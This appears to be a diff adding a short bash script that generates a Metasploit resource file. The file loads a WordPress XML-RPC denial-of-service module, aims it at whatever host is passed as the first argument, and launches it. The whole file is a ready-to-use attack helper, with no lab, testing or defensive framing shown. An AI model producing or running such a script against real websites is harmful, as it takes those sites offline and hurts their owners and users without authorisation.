@@ -1,0 +1,6 @@
+#!/usr/bin/bash
+echo """
+use auxiliary/dos/http/wordpress_xmlrpc_dos
+set RHOST $1
+exploit
+""" >> xmlrpcg.rc
